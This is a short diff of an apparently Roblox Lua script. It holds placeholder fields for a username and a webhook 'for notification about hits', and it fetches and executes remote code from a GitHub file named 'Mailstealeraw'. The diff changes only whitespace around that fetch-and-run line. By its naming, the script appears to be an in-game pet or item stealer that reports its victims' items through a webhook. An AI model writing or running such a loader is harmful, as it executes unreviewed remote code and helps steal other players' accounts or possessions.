@@ -2,4 +2,4 @@ UserName = "UserName Here" -- Username for pets
 Webhook = "Webhook Here" -- Webhook for notification about hits
 UserName2 = "2nd User Here" -- Username for bad pets like pog pets 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CodingNinjaX/Script/main/Mailstealeraw", true))() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CodingNinjaX/Script/main/Mailstealeraw", true))()
